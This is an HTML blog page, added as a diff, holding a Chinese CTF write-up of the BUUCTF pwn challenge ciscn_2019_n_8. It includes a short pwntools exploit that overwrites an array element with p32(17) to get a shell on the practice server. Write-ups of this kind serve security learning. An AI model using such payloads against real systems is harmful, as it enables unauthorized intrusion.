@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>BUUCTF Pwn Ciscn_2019_n_8 | NiceSeven&#39;s Website</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    
+  </head>
+
+  <body>
+    <nav>
+    <ul class="menu">
+      
+      <li><a href="/">Home</a></li>
+      
+      <li><a href="/about/">About</a></li>
+      
+      <li><a href="/categories/">Categories</a></li>
+      
+      <li><a href="/tags/">Tags</a></li>
+      
+      <li><a href="/">Links</a></li>
+      
+    </ul>
+    <hr/>
+    </nav>
+
+<div class="article-meta">
+<h1><span class="title">BUUCTF Pwn Ciscn_2019_n_8</span></h1>
+<h2 class="author">NiceSeven</h2>
+<h2 class="date">2020/02/13</h2>
+</div>
+
+<main>
+<h1 id="ciscn_2019_n_8">ciscn_2019_n_8</h1>
+<p>checksec一下</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200213115514266.png" alt="image-20200213115514266"></p>
+<p>32位，防护基本上全开，不要吓到</p>
+<p>拖入ida看一下伪代码</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200213120226981.png" alt="image-20200213120226981"></p>
+<p>可以看到满足var[13] = 17也就是数组中的第14个数为17，即执行shell</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200213120449814.png" alt="image-20200213120449814"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200213122819593.png" alt="image-20200213122819593"></p>
+<p>通过汇编知道var[]是一个四字节的整数类型数组，在ida中显示的数据类型DWORD与QWORD的区别不是很清楚</p>
+<p>暂时理解DWORD为32位的4字节数组，QWORD理解为64位的4字节数组</p>
+<p>exp</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
+<span style="color:#75715e">#-*-coding=UTF-8-*-</span>
+
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+context(log_level<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">debug</span><span style="color:#e6db74">&#39;</span>)
+sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">node3.buuoj.cn</span><span style="color:#e6db74">&#39;</span>,<span style="color:#ae81ff">28862</span>)
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span><span style="color:#f92672">*</span><span style="color:#ae81ff">13</span> <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">17</span>) <span style="color:#75715e">#p32(17)=\x11\x00\x00\x00,16进制小端存储，0x11(16)=17(10)</span>
+<span style="color:#75715e">#这里*4是因为4字节的数组每一项要4字节才能填满，*13是把数组前13项填满，第14项用</span>
+sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">What</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">s your name?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,payload)
+sh<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200213123641425.png" alt="image-20200213123641425"></p>
+
+</main>
+
+  <footer>
+  
+  
+  <hr/>
+  © <a href="/">NiceSeven</a> 2017 &ndash; 2020 | <a href="https://github.com/NiceSeven">Github</a> |
+  
+  </footer>
+  </body>
+</html>
+
